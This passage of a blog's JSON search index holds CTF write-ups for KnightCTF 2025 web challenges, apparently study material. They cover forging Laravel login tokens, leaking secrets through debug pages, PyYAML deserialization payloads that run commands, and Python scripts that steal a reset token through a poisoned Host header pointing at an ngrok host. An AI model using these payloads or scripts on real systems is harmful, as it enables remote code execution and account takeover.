        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:7:0",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "A detailed write-up of the Web challenge 'Knight Connect' from KnightCTF - 2025",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/",
        "tags": [
          "\ud83d\udd10 Insecure Authentication",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": " Challenge Presentation \ud83d\udcca Challenge Overview Category Details Additional Info \ud83c\udfc6 Event KnightCTF - 2025 Event Link \ud83d\udd30 Category Web \ud83c\udf10 \ud83d\udc8e Points 260 Out of 500 total \u2b50 Difficulty \ud83d\udfe2 Easy Personal Rating: 3/10 \ud83d\udc64 Author NomanProdhan Profile \ud83c\udfae Solves (At the time of flag submission) 49 XX% solve rate \ud83d\udcc5 Date 20-01-2025 KnightCTF - 2025 Day X \ud83e\uddbe Solved By Bebo07 Team: QnQSec ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:0:0",
        "tags": [
          "\ud83d\udd10 Insecure Authentication",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udcdd Challenge Information In a realm where ancient knights and modern technology collide, a mysterious portal emerges\u2014known as \u201cKnight Connect.\u201d Only the wisest and most cunning warriors can decipher its secrets. Legends whisper of a forgotten system, guarded by layers of encryption and vulnerabilities, waiting for a brave soul to breach its defenses. Do you possess the skills to uncover the truth? Enter the domain of Knight Connect and etch your name into the annals of digital knighthood. The challenge awaits. ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:1:0",
        "tags": [
          "\ud83d\udd10 Insecure Authentication",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83c\udfaf Challenge Files & Infrastructure ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:2:0",
        "tags": [
          "\ud83d\udd10 Insecure Authentication",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Provided Files Files: \u00a0Attached Files \ud83d\udd0d Initial Analysis ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:2:1",
        "tags": [
          "\ud83d\udd10 Insecure Authentication",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "First Steps The site initially appeared as follows: Site Presentation with a login screen. After completing the registration and login, I was redirected to the following page: Home Page I couldn\u2019t find anything else on the site, so I started reading the attached files. At first, I was overwhelmed and didn\u2019t know where to look due to the number of files present. The first thing that came to mind was to forge some session cookies since the APP_KEY of Laravel was in the .env file. Also, because it required the session to be set to is_admin in order to display the flag. We can see this from the following lines of code in the index.blade.php file under the resources/views/users folder: @if (isset($flag) && session()->has('is_admin') && session('is_admin')) <div class=\"flag\">Flag: {{ $flag->flag }}</div> @endif but then I discovered that it wasn\u2019t the right path. However, I realized that I needed to get an administrator account to be able to read the flag. In the web.php file under the resources/routes folder, I found all the routes of the site, including one that seemed a bit suspicious: /contact. Visiting it redirected me to the following page: Contact where the administrator accounts and their respective emails were displayed. Spoiler: only one of these was valid, which was nomanprodhan@knightconnect.com (the username of the challenge creator). I then continued looking at other files, but I was interested in how authentication was being handled, so I searched for the authentication file, which was named AuthController.php under the Http/Controllers folder. Here I found the vulnerability\u2014there were two functions that allowed you to request a login link for an account, which created a token formed by combining the email and a timestamp at that moment, all encrypted using the bcrypt function. The other function allowed you to log in using that generated link by passing the token as a parameter: public function requestLoginUrl(Request $request) { $request->validate([ 'email' => 'required|email', ]); $user = User::where('email', $request->email)->first(); if (!$user) { return back()->withErrors(['email' => 'Email not found']); } $time = time(); $data = $user->email . '|' . $time; $token = bcrypt($data); $loginUrl = url('/login-link?token=' . urlencode($token) . '&time=' . $time . '&email=' . urlencode($user->email)); return back()->with('success', 'Login link generated, but email sending is disabled.'); } public function loginUsingLink(Request $request) { $token = $request->query('token'); $time = $request->query('time'); $email = $request->query('email'); if (!$token || !$time || !$email) { return response('Invalid token or missing parameters', 400); } if (time() - $time > 3600) { return response('Token expired', 401); } $data = $email . '|' . $time; if (!Hash::check($data, $token)) { return response('Token validation failed', 401); } $user = User::where('email', $email)->first(); if (!$user) { return response('User not found', 404); } session(['user_id' => $user->id]); session(['is_admin' => $user->is_admin]); return redirect()->route('users'); } the first function doesn\u2019t really have any vulnerabilities, since it only shows how the token is created to request the \u201cinstant\u201d login URL. In contrast, the second function has a significant vulnerability, as the only check it does is ensure the timestamp of the generated token is at most one hour old (3600 seconds), otherwise, it becomes invalid. However, we can manipulate the timestamp ourselves by passing a fake value as a parameter. In fact, to make it secure, the generated token with the timestamp should have been saved in the database, and if it wasn\u2019t the exact timestamp, it wouldn\u2019t allow access (although a brute-force attack could be used to try all possible timestamps). So, I realized that it\u2019s possible to forge a token\u2014one just needs to know the email of the account they want to access, and as we saw earlier in the /contact route, there were quite a few admin emails\u2026 Now that we\u2019ve figured it all out, let\u2019s proceed with the exploit. ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:3:0",
        "tags": [
          "\ud83d\udd10 Insecure Authentication",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udd2c Vulnerability Analysis ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:4:0",
        "tags": [
          "\ud83d\udd10 Insecure Authentication",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Potential Vulnerabilities Insecure Authentication \ud83c\udfaf Solution Path ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:4:1",
        "tags": [
          "\ud83d\udd10 Insecure Authentication",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Exploitation Steps ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:5:0",
        "tags": [
          "\ud83d\udd10 Insecure Authentication",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Initial setup Initially, to generate the URL, I used https://onlinephp.io/. I also found this website useful for generating \u201cpasswords\u201d with Laravel\u2019s bcrypt (https://fbutube.com/laravel-password-generator). However, in the end, I decided to write it in PHP and run it locally, as this way I could fully automate the process. ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:5:1",
        "tags": [
          "\ud83d\udd10 Insecure Authentication",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Exploitation After obtaining the admin\u2019s email nomanprodhan@knightconnect.com, it was quite simple to forge a token, since it was made up of \u201cemail|timestamp\u201d. I then wrote a PHP script that did exactly what the first function did, using bcrypt on the string formed by the admin\u2019s email + timestamp, and then generating a link similar to the one in the function with the parameters token, time, and email. This way, I created a valid login link, since the user associated with the email actually existed. I gained access to their account, and by visiting the homepage as seen earlier, with the is_admin flag on the account, I was able to retrieve the flag. ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:5:2",
        "tags": [
          "\ud83d\udd10 Insecure Authentication",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Flag capture Manual Flag \ud83d\udee0\ufe0f Exploitation Process ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:5:3",
        "tags": [
          "\ud83d\udd10 Insecure Authentication",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Approach I wrote the exploit in PHP because I had issues with token composition using bcrypt in Python. This exploit takes the admin\u2019s email, which has the flag in their profile, and then creates a valid token with a timestamp less than one hour old. It then generates a URL with a valid token to access the admin profile, and through a cURL function in PHP, it makes a request to the page, extracting the flag via a regex. I used the following commands for the requirements and the run: sudo apt install php sudo apt-get install php-curl php exploit.php \u00a0Exploit \ud83d\udea9 Flag Capture Flag ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:6:0",
        "tags": [
          "\ud83d\udd10 Insecure Authentication",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Proof of Execution Automated Flag Screenshot of successful exploitation \ud83d\udd27 Tools Used ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:7:0",
        "tags": [
          "\ud83d\udd10 Insecure Authentication",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Primary Tools Tool Purpose PHP Exploit \ud83d\udca1 Key Learnings ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:8:0",
        "tags": [
          "\ud83d\udd10 Insecure Authentication",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous \ud83d\udcda References & Resources ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:9:0",
        "tags": [
          "\ud83d\udd10 Insecure Authentication",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Learning Resources https://laravel.com/docs/11.x/hashing \ud83d\udcca Final Statistics Metric Value Notes Time to Solve 00:30 From start to flag Global Ranking (At the time of flag submission) 10/451 Challenge ranking Points Earned 260 Team contribution Created: 20-01-2025 \u2022 Last Modified: 20-01-2025 Author: mH4ck3r0n3 \u2022 Team: QnQSec ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:10:0",
        "tags": [
          "\ud83d\udd10 Insecure Authentication",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "A detailed write-up of the Web challenge 'Exceeding Knight' from KnightCTF - 2025",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/exceeding-knight/",
        "tags": [
          "\ud83d\uded1 Improper Error Handling",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Exceeding Knight",
        "uri": "/posts/2025/02/04/exceeding-knight/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Challenge Description Challenge Presentation ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/exceeding-knight/:0:1",
        "tags": [
          "\ud83d\uded1 Improper Error Handling",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Exceeding Knight",
        "uri": "/posts/2025/02/04/exceeding-knight/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Initial Analysis The site appeared as follows: Site Presentation There was nothing interesting here, so I began reading the attached files. The first thing I did was read the web.php file located in the routes folder. I found the following routes: Route::get('/calculator', [CalculatorController::class, 'index']); Route::post('/calculator', [CalculatorController::class, 'calculate']); // Handle form submission Route::get('/convert', [UnitConversionController::class, 'index']); Route::post('/convert', [UnitConversionController::class, 'convert']); Route::get('/character-count', [StringManipulationController::class, 'characterCountIndex']); Route::post('/character-count', [StringManipulationController::class, 'characterCount']); Route::get('/reverse-string', [StringManipulationController::class, 'reverseStringIndex']); Route::post('/reverse-string', [StringManipulationController::class, 'reverseString']); Route::post('/profile', [ProfileController::class, 'index']); Route::get('/profile/error', [ProfileController::class, 'triggerError']); // Error-triggering route Route::get('/', function () { return view('welcome'); Next, I read the .env file and found something interesting: APP_NAME=Laravel APP_ENV=local APP_KEY=base64:KnrD53eO60BJBvCVGNlBuOqktUCAsTuod34OelLJjPQ= APP_DEBUG=true APP_URL=http://localhost MAX_CALC_LIMIT=100000000000000000 LOG_CHANNEL=stack LOG_DEPRECATIONS_CHANNEL=null LOG_LEVEL=debug DB_CONNECTION=mysql DB_HOST=127.0.0.1 DB_PORT=3306 DB_DATABASE=laravel DB_USERNAME=root DB_PASSWORD= BROADCAST_DRIVER=log CACHE_DRIVER=file FILESYSTEM_DISK=local QUEUE_CONNECTION=sync SESSION_DRIVER=file SESSION_LIFETIME=120 FLAG=KCTF{i_am_not_flag} Aside from the APP_KEY and FLAG, as we can see, Laravel\u2019s debug mode is enabled. When debug mode is enabled in Laravel, any error that occurs will trigger a detailed error page. This page includes: Error Message: A clear description of the error. Stack Trace: A full trace of the error, showing the file paths and lines of code where the issue occurred. Environment Details: Information about the environment, including variables, configurations, and request headers. Sensitive Data Exposure: Potential exposure of .env values, database credentials, API keys, and other sensitive information. So, I thought about exploiting the enabled debug mode in Laravel to capture the flag. The only thing I needed was a way to trigger any kind of error. I found this method in the /calculator route, to be more precise, in the CalculatorController.php file under the Http/Controllers folder. As we can see, by entering a number greater than MAX_CALC_LIMIT=100000000000000000 an exception is thrown: <?php namespace App\\Http\\Controllers; use Illuminate\\Http\\Request; class CalculatorController extends Controller { public function index() { return view('calculator'); } public function calculate(Request $request) { $request->validate([ 'num1' => 'required|numeric', 'num2' => 'required|numeric', 'operation' => 'required|in:add,sub,mul,div', ]); $num1 = $request->input('num1'); $num2 = $request->input('num2'); $operation = $request->input('operation'); $limit = env('MAX_CALC_LIMIT', 100000); if ($num1 > $limit || $num2 > $limit) { throw new \\Exception(\"You have hit the calculation limit set in the .env file.\"); } $result = match ($operation) { 'add' => $num1 + $num2, 'sub' => $num1 - $num2, 'mul' => $num1 * $num2, 'div' => $num2 != 0 ? $num1 / $num2 : throw new \\Exception(\"Division by zero is not allowed.\"), }; return view('calculator', ['result' => $result]); } } ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/exceeding-knight/:0:2",
        "tags": [
          "\ud83d\uded1 Improper Error Handling",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Exceeding Knight",
        "uri": "/posts/2025/02/04/exceeding-knight/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Exploit So, all I had to do was enter 1000000000000000000 (just adding a simple zero) in the num1 parameter to trigger the exception. This caused the detailed error page to return, which contained the flag inside it: Manual Flag ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/exceeding-knight/:0:3",
        "tags": [
          "\ud83d\uded1 Improper Error Handling",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Exceeding Knight",
        "uri": "/posts/2025/02/04/exceeding-knight/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Flag Flag ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/exceeding-knight/:0:4",
        "tags": [
          "\ud83d\uded1 Improper Error Handling",
          "\ud83d\udcbb Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Exceeding Knight",
        "uri": "/posts/2025/02/04/exceeding-knight/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "A detailed write-up of the Web challenge 'Baby Injection' from KnightCTF - 2025",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/baby-injection/",
        "tags": [
          "\u203c\ufe0f YAML Insecure Deserialization",
          "\u203c\ufe0f Insecure Deserialization",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Baby Injection",
        "uri": "/posts/2025/02/04/baby-injection/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Challenge Description Challenge Presentation ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/baby-injection/:0:1",
        "tags": [
          "\u203c\ufe0f YAML Insecure Deserialization",
          "\u203c\ufe0f Insecure Deserialization",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Baby Injection",
        "uri": "/posts/2025/02/04/baby-injection/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Initial Analysis The site appears as follows: Site Presentation The first thing that immediately stands out is the site\u2019s URL: http://172.105.121.246:5990/eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE= In fact, that looks like a base64 encoding. Let\u2019s try to decode it: echo \"eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE=\" | base64 -d Decoding it, I got the following: yaml: Its yaml bro, hack me if you can!!! So, the decoded base64 seems to be reflected on the page, as we can see from the previous screenshot. It seems that since it mentions YAML, this could be a case of YAML insecure deserialization. In fact, looking at the request header, we can tell that everything is being executed with Python. Since Python has a library called PyYAML, we can exploit the deserialization process to achieve Remote Code Execution (RCE). ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/baby-injection/:0:2",
        "tags": [
          "\u203c\ufe0f YAML Insecure Deserialization",
          "\u203c\ufe0f Insecure Deserialization",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Baby Injection",
        "uri": "/posts/2025/02/04/baby-injection/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Exploit I personally used this payload: yaml: !!python/object/apply:eval [\"__import__('os').listdir('.')\"] But many other payloads could have been used, such as: yaml: !!python/object/apply:subprocess.getoutput [\"ls -al\"] Other payloads can be found on PayloadsAllTheThings. So, I simply encoded it in base64: echo \"yaml: python/object/apply:subprocess.getoutput ['ls -al']\" | base64 And that\u2019s how I formed the URL for injecting the \u201cls -al\u201d command: http://172.105.121.246:5990/eWFtbDogcHl0aG9uL29iamVjdC9hcHBseTpzdWJwcm9jZXNzLmdldG91dHB1dCBbJ2xzIC1hbCdd By opening the URL, the command was executed on the server, listing the directories, and in doing so, I found the flag: Manual Flag ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/baby-injection/:0:3",
        "tags": [
          "\u203c\ufe0f YAML Insecure Deserialization",
          "\u203c\ufe0f Insecure Deserialization",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Baby Injection",
        "uri": "/posts/2025/02/04/baby-injection/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Automated Exploit I also created an automated Python exploit for extracting the flag: import requests import base64 import re url = \"http://172.105.121.246:5990/\" payload = '''yaml: !!python/object/apply:eval [\"__import__('os').listdir('.')\"]''' print(\"\\nFLAG: \" + re.search(r'KCTF{[a-f0-9]+}', requests.get(url + base64.b64encode(payload.encode('utf-8')).decode('utf-8')).text).group(0)) ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/baby-injection/:0:4",
        "tags": [
          "\u203c\ufe0f YAML Insecure Deserialization",
          "\u203c\ufe0f Insecure Deserialization",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Baby Injection",
        "uri": "/posts/2025/02/04/baby-injection/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Flag Flag ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/baby-injection/:0:5",
        "tags": [
          "\u203c\ufe0f YAML Insecure Deserialization",
          "\u203c\ufe0f Insecure Deserialization",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Baby Injection",
        "uri": "/posts/2025/02/04/baby-injection/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "A detailed write-up of the Web challenge 'Admin Access' from KnightCTF - 2025",
        "date": "03/02/2025",
        "objectID": "/posts/2025/02/03/admin-access/",
        "tags": [
          "\ud83d\udc89 Host Header Injection",
          "\ud83d\udc80 Password Reset Poisoning",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Admin Access",
        "uri": "/posts/2025/02/03/admin-access/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Initial Analysis The site appeared as follows, with a login screen: Site Presentation After completing the registration and login phase, you would enter a completely empty dashboard where the only available action was to log out. That\u2019s when I realized that registering was pointless. Inspecting the page source, I found a strange comment: Admin Email the comment revealed an email, most likely belonging to the account containing the flag. Continuing to explore the site since it was a black-box challenge without any files I found the \u201cForgot Password\u201d section: Forgot Password Where it was possible to specify an email to reset a password. At this point, I thought about resetting the password for the account associated with the email I had found earlier. And I considered a Host Header Injection. ",
        "date": "03/02/2025",
        "objectID": "/posts/2025/02/03/admin-access/:0:1",
        "tags": [
          "\ud83d\udc89 Host Header Injection",
          "\ud83d\udc80 Password Reset Poisoning",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Admin Access",
        "uri": "/posts/2025/02/03/admin-access/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Exploit So i started ngrok on port 80: And then, using Burp Suite, I modified the Host header to Host: ngrok_link. By sending the request with the modified Host header through ngrok, I was able to extract the reset token from the previously sent \u201cForgot Password\u201d request with the email kctf2025@knightctf.com: Intercept After extracting the valid token, I reset the password using the obtained link and logged in with the account using the following credentials: username: kctf2025 password: new_password Manual Flag ",
        "date": "03/02/2025",
        "objectID": "/posts/2025/02/03/admin-access/:0:2",
        "tags": [
          "\ud83d\udc89 Host Header Injection",
          "\ud83d\udc80 Password Reset Poisoning",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Admin Access",
        "uri": "/posts/2025/02/03/admin-access/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Automated Exploit I also created a fully automated exploit that performs the entire process described earlier: ngrok http 8080 # (set the ngrok url in the request.py file) python exploit.py python request.py this is exploit.py: import http.server import socketserver import requests import re from urllib.parse import urlparse, parse_qs class MyHandler(http.server.BaseHTTPRequestHandler): def do_GET(self): # Extract the token parameter from the request token = parse_qs(urlparse(self.path).query).get('token', [None])[0] self.send_request(token) def send_request(self, token): s = requests.Session() url = \"http://45.56.68.122:7474/\" password = \"supermario45\" data ={ \"token\":token, \"new_password\":password } # Request for the password reset of the admin account s.post(url+\"reset-password\", data=data).text credentials={ \"username\":\"kctf2025\", \"password\":password } # Request login admin account with Flag extraction via Regex print(\"\\nFLAG: \" + re.search(r'KCTF{[^}]+}', s.post(url, data=credentials).text).group(0)) def start_server(): PORT = 8080 with socketserver.TCPServer((\"\", PORT), MyHandler) as httpd: httpd.serve_forever() if __name__ == \"__main__\": start_server() and this is request.py: import requests requests.post(\"http://45.56.68.122:7474/forgot-password\", data={\"email\":\"kctf2025@knightctf.com\"}, headers={\"Host\":\"6cde-93-70-84-224.ngrok-free.app\"}) ",
        "date": "03/02/2025",
        "objectID": "/posts/2025/02/03/admin-access/:0:3",
        "tags": [
          "\ud83d\udc89 Host Header Injection",
          "\ud83d\udc80 Password Reset Poisoning",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Admin Access",
        "uri": "/posts/2025/02/03/admin-access/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Flag Flag ",
        "date": "03/02/2025",
        "objectID": "/posts/2025/02/03/admin-access/:0:4",
        "tags": [
          "\ud83d\udc89 Host Header Injection",
          "\ud83d\udc80 Password Reset Poisoning",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Admin Access",
        "uri": "/posts/2025/02/03/admin-access/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "About Me"
        ],
        "content": " Hi, I'm Matteo Maccarone, a passionate computer science enthusiast with a particular interest in cybersecurity. I've always aimed to combine my curiosity with a passion for cybersecurity, approaching every new project with enthusiasm and dedication. ",
        "date": "03/02/2025",
        "objectID": "/about/:0:0",
        "tags": [
          "\ud83d\udc64\u200b About Me"
        ],
        "title": "\ud83d\udc64 About Me",
        "uri": "/about/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "About Me"
        ],
        "content": "Who Am I I consider myself a very curious person with a strong passion for knowledge. Over the years, I\u2019ve developed skills in programming and cybersecurity. Outside of my work, I enjoy traveling and playing CTF (Capture The Flag), which helps me maintain a balance between creativity and productivity. Check out my CTFtime and TryHackMe profiles: CTFtime TryHackMe Currently a member of the teams: Havce aetruria QnQSec ",
        "date": "03/02/2025",
        "objectID": "/about/:1:0",
        "tags": [
          "\ud83d\udc64\u200b About Me"
        ],
        "title": "\ud83d\udc64 About Me",
        "uri": "/about/"
      }
    },
    {
      "action": "updateObject",
      "body": {
